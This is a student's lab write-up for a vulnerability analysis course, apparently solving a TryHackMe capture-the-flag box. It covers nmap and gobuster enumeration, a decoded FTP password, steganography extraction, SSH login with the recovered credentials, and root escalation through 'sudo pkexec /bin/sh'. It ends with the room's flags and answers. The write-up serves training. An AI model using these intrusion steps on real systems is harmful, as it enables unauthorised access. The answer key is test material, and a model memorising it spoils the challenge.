# 🛡️ Vulnerability Analysis Lab - Week 6

## 📌 Course Information
- **Course**: IKB21403 - Vulnerability Analysis  
- **Programme**: Bachelor of Information Technology (Hons) in Computer System Security  
- **Student**: Haziq Danial Bin Nor Azan  

---

## 🎯 Objective
This lab focuses on performing vulnerability analysis using enumeration techniques, FTP access, steganography, and privilege escalation to obtain user and root flags.

---

## Step 1: Scanning the Target

- Target Machine
- My IP Address: **10.48.171.208**
- In this phase, I used Nmap to scan the target machine and identify open ports and running services.
- This is a command for Scanning 

```bash
nmap -sC -sV 10.48.171.208
```
Gambar 

**we found 4 port**
  
  - port 21/tcp - FTP - (vsftpd 3.0.2)
  - port 22/tcp - SSH - (OpenSSH 6.7p1)
  - port 80/tcp - HTTP - (Apache httpd)
  - port 111/tcp - RPC - (rpcbind)

## Step 2: Enumeration 

- Open browser and put IP target **10.48.171.208**
- We find a webpage about a short story about ARROWVERSE
  
- Gambar 

-  Now run gobuster for hidden Directories.
-  This command for gobuster

```bash
gobuster dir -u http://10.48.171.208/ --w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
- gambar

- Found a directory : /island


- Now go to the browser and serarch
```bash
 http://10.48.171.208/island
```
- Gambar 

- Found out the Code Word by highlighting the page text or viewing the page source.
  Code Word - 'vigilante' - (this is our FTP username)

- Gambar

- Again run gobuster on /island directory to discover a different directory.
```bash
gobuster dir -u http://10.48.171.208/island -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
- Gambar
- Here we found another directory : **/2100** -- (What is the Web Directory you found?)

- Now doing the same again go to the browser and serarch
```bash
http://10.48.171.208/island/2100
```

- view the page source
- Gambar

- Here it says there is a file with a '.ticket' extension.
- Now again run gobuster to look for files with a '.ticket' extension.
```bash
gobuster dir --url 10.48.171.208/island/2100 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
```
- Gambar
- Found another director : /green_arrow.ticket

- Again going to the browser search
```bash
http://10.48.171.208/island/2100/green_arrow.ticket.
```
- Gambar

- It seems we found an encryption: **'RTy8yhBQdscX'** . So now let’s try to decode it
```bash
RTy8yhBQdscX
```
- Go to **https://gchq.github.io/CyberChef/**
  Use 'FromBase58' to decode it.

- Gambar

- Seems like we have cracked it : **'!#th3h00d'** - This is the FTP Password.
```bash
!#th3h00d
```

## Step 3: FTP Login 
- Now as we have the username and passowrd
  - Username - **vigilante**
  - password - **!#th3h00d**
- We can log in to the FTP service
```bash
ftp 10.48.171.208
```
- Gambar
  
- We find 3 image files, download all of them, and also download .bash_history.

  - get Leave_me_alone.png
  - get Queen’s_Gambit.png
  - get aa.jpg
  - get .bash_history

- Gambar

- Moving up again, we can access the root directory and even visit other directories, which are worth enumerating later.
  - cd ..
  - ls -al
  - cd /tmp
  - ls -al

- Now view the image files and we see that 'Leave.me.alone.png' is not opening.
- Also the exiftool shows 'File Format error'

- Gambar 

## Step 4: FTP File Enumeration 
- We find 1 PNG, 1 JPG, and 1 corrupted PNG.
  - gambar 1
  - gambar 2
  - gambar 3

- here might be something hidden within them.
- Try to read readable strings, read metadata, and find hidden files.
- Repeat below command for all files
  
  - strings aa.jpg | less
  - binwalk aa.jpg
  - exiftool aa.jpg
  - steghide info aa.jpg

- gambar

## Step 5: Extract Hidden Files and Gain Access

- The password might be in corrupted Leave_me_alone.png.
- Create copy of the file because we might alter it.
- Using file command, it is detected as data, not an image file.
```bash
file Leave_me_alone.jpg
```
- Gambar

- file command identifies files based on magic bytes/headers, which are the first 8 bytes of the file.
- Checking with hexedit, we find the first 6 bytes are wrong.
```bash
hexedit Leave_me_alone.png
```
 - Gambar 1 code hexedit
```bash
58 45 6F AE 0D 0A 1A 0A 
```
 - Gambar dalam code salah 

 - Try to fix them into **89 50 4E 47 0D 0A 1A 0A** (PNG's magic bytes), then press Ctrl+X to save and exit.
```bash
89 50 4E 47 0D 0A 1A 0A
```
- gambar code betul 

- Now it’s readable, and we get the password: password.
```bash
password
```
- Gambar dpt password 

- Back to steghide, extract the hidden files in aa.jpg.
```bash
steghide info aa.jpg
steghide extract -sf aa.jpg
unzip ss.zip
cat passwd.txt
cat shado
```

- Gambar steghide 

- We find 2 files.
  - passwd.txt
  - shado

- One of them contains the password: M3tahuman.
```bash
M3tahuman
```
- Earlier hints suggest checking another user.
- We try this password to gain access as slade. It works, and we can obtain the user flag.

## Step 6: SSH Login 

- Now as we have got the ssh password we can now login
  - User - slade
  - password - M3tahuman
```bash
ssh slade@10.48.171.208
```
- Gambar Welcome

- Now that you logged in search the user.txt flag
  - slade@LianYu:~$ ls
  - user.txt
```bash
ls
user.txt
cat user.txt
```
- And we get the flag
```bash
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

- gambar Flag 

## Step 7: Root Privilage Escalation

- To find which commands we can run with root privileges we can run:
```bash
sudo -l
```
- Gambar

- After running sudo -l , it will again ask for slade password -- use the same password - 'M3tahuman'.
```bash
M3tahuman
```
- Now You see it says we can run the 'pkexec' with root privileges
- So now we can run run '/bin/sh' program as root & get the root access.
```bash
sudo pkexec /bin/sh

# whoami
root
# ls
root.txt
#cat root.txt
```
- Gambar 

- we get another Flag
```bash
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```


## Answer
```bash
Deploy the VM and Start the Enumeration.
-No answer needed

What is the Web Directory you found?
-2100

what is the file name you found?
-green_arrow.ticket

what is the FTP Password?
-!#th3h00d

what is the file name with SSH password?
-shado

user.txt
-THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

root.txt
-THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```
- Gambar Full




